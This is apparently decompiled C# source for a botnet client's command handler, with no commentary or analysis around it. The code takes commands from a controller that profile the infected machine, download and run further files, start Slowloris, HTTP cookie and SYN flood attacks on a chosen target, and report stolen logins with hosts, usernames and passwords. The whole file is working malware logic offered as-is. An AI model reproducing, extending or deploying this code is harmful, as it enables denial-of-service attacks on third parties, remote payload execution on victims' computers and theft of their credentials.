using System;
using System.Windows.Forms;

internal sealed class Class28
{
	public static void smethod_0(string string_0)
	{
		string[] array = string_0.Split(new char[1] { '*' });
		if (string_0.Contains(".info"))
		{
			Class29.class26_0.method_3("Info Task -> OS: " + Class25.smethod_1() + " -Country: " + Class25.smethod_2() + " -User: " + Environment.UserDomainName + "/" + Environment.UserName + " -Graphic: " + Class25.smethod_3(), Class30.string_1, "cyan");
		}
		if (string_0.Contains(".version"))
		{
			Class29.class26_0.method_3("Info Task -> Version: " + Class30.string_2, Class30.string_1, "cyan");
		}
		if (string_0.Contains(".path"))
		{
			Class29.class26_0.method_3("Info Task -> Path: " + Application.get_ExecutablePath(), Class30.string_1, "cyan");
		}
		if (string_0.Contains(".dl"))
		{
			Class0.smethod_0(array[1]);
			Class29.class26_0.method_3("Task: File downloaded & executed!", Class30.string_1, "lime");
		}
		if (string_0.Contains(".update"))
		{
			Class0.smethod_0(array[1]);
			Class29.class26_0.method_3("Task: Update started!", Class30.string_1, "lime");
			Class27.smethod_0();
		}
		if (string_0.Contains(".kill"))
		{
			Class29.class26_0.method_3("Task: Bot exits now, bye!", Class30.string_1, "lime");
			Environment.Exit(0);
		}
		if (string_0.Contains(".slowloris"))
		{
			Class5.string_0 = array[1];
			Class5.smethod_0();
			Class29.class26_0.method_3("DDos: Slowloris Flood on " + Class5.string_0 + " started!", Class30.string_1, "lime");
		}
		if (string_0.Contains(".httpcookie"))
		{
			Class2.string_0 = array[1];
			Class2.int_1 = Convert.ToInt32(array[2]);
			Class2.int_0 = Convert.ToInt32(array[3]);
			Class2.bool_0 = true;
			Class2.smethod_1();
			Class29.class26_0.method_3("DDos: HTTP COOKIE Flood on " + Class2.string_0 + " started!", Class30.string_1, "lime");
		}
		if (string_0.Contains(".syn"))
		{
			Class7.string_0 = array[1];
			Class7.int_0 = Convert.ToInt32(array[2]);
			Class7.int_2 = Convert.ToInt32(array[3]);
			Class7.int_1 = Convert.ToInt32(array[4]);
			Class7.smethod_0();
			Class7.bool_0 = true;
			Class29.class26_0.method_3("DDos: SYN Flood on " + Class7.string_0 + " started!", Class30.string_1, "lime");
		}
		if (string_0.Contains(".stopddos"))
		{
			Class4.smethod_0();
		}
		if (!string_0.Contains(".stealer"))
		{
			return;
		}
		string value = array[1];
		if (array[1] == "ListAll")
		{
			for (int i = 0; i <= Class12.list_0.Count - 1; i++)
			{
				Class29.class26_0.method_3("Task: Found Login -> Application: " + Class12.list_0[i].method_0() + " Host: " + Class12.list_0[i].method_2() + " User: " + Class12.list_0[i].method_4() + " Password: " + Class12.list_0[i].method_6(), Class30.string_1, "cyan");
			}
			return;
		}
		for (int i = 0; i <= Class12.list_0.Count - 1; i++)
		{
			if (Class12.list_0[i].method_2().Contains(value))
			{
				Class29.class26_0.method_3("Task: Found Login -> Application: " + Class12.list_0[i].method_0() + " Host: " + Class12.list_0[i].method_2() + " User: " + Class12.list_0[i].method_4() + " Password: " + Class12.list_0[i].method_6(), Class30.string_1, "cyan");
			}
		}
	}
}
